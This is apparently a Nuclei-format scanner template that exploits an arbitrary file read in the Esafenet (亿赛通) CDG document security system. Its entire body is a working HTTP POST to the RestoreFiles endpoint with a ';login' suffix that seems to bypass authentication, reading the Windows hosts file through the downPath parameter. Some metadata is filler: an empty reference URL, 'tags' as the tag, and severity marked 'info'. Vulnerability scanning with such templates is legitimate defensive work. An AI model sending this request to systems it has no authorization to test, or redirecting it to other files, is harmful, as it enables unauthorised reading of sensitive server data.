id: yst-RestoreFiles-fileread
info:
  name: 亿赛通电子文档安全管理系统RestoreFiles存在任意文件读取漏洞
  author: apple
  severity: info
  description: 亿赛通电子文档安全管理系统RestoreFiles存在任意文件读取漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        command=DownloadDoc&fileNameForDownload=&downPath=C:/Windows/System32/drivers/etc/hosts
    matchers:
      - type: word
        part: body
        words:
          - 'Copyright'
